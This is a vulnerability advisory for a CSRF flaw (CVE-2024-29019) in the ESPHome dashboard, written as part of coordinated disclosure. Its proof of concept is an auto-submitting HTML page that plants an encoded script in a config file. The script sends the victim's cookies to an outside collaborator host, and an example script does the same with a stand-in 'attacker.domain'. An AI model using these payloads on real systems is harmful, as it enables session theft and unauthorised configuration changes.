# Authentication bypass via Cross site request forgery (CVE-2024-29019) #

## Summary
API endpoints in dashboard component of ESPHome version 2023.12.9 (command line installation) are vulnerable to Cross-Site Request Forgery (CSRF), allowing remote attackers to carry out attacks against a logged user of the dashboard, to perform operations on configuration files (create, edit, delete).

## Affected products
* ESPHome versions >= 2023.12.9, < 2024.3.0

## Details
It is possible for a malicious actor to create a specifically crafted web page that triggers a cross site request against ESPHome. This allows bypassing the authentication for API calls on the platform by tricking the victim into visiting a link.

## PoC
An example of malicious web page that abuses this vulnerability:

```
<html>
  <body>
	<form action="http://localhost:6052/edit?configuration=poc.yaml" id="#main" method="POST" enctype="text/plain" onsubmit="setTimeout(function () { window.location.reload(); }, 10)">
	<input type="hidden" name="&lt;script&gt;&#13;&#10;fetch&#40;&apos;https&#58;&#47;&#47;907zv9yp9u3rjerkiakydpvcr3xulk99&#46;oastify&#46;com&#63;x" value="y&apos;&#44;&#32;&#123;&#13;&#10;method&#58;&#32;&apos;POST&apos;&#44;&#13;&#10;mode&#58;&#32;&apos;no&#45;cors&apos;&#44;&#13;&#10;body&#58;document&#46;cookie&#13;&#10;&#125;&#41;&#59;&#13;&#10;&lt;&#47;script&gt;&#13;&#10;" />
	</form>

	<script>
	document.forms[0].submit();
	</script>

  </body>
</html>
```
In this PoC code, the attacker creates and weaponizes "poc.yaml" config file containing a cookie exfiltration script which will be executed when an authenticated user clicks on the malicious link provided by the attacker.

Example of such script:
```
<script>
fetch('https://attacker.domain', {
	method: 'POST', mode: 'no-cors', body:document.cookie });
</script>
```

## Impact
This vulnerability allows bypassing authentication on API calls accessing configuration file operations on the behalf of an authenticated user. Furthermore, it is possible to chain this vulnerability with CVE-2024-27287 forcing the victim to load the content of the injected file (poc.yaml), and execute its malicious content, as demonstrated by the PoC code.

## Additional information

### Credit
Spike Reply Cybersecurity Team

### Acknowledgments
Thanks to ESPHome developers for their support with the disclosure of this issue.

### References
- https://nvd.nist.gov/vuln/detail/CVE-2024-29019
- https://github.com/advisories/GHSA-5925-88xh-6h99

### Disclosure timeline

- February 20, 2024: Initial vendor contact
- March 19, 2024 Patch proposed by ESPHome
- March 20, 2024 Spike Reply Cybersecurity Team confirms that security fixes included in patched version are effective
- March 20, 2024: Disclosure
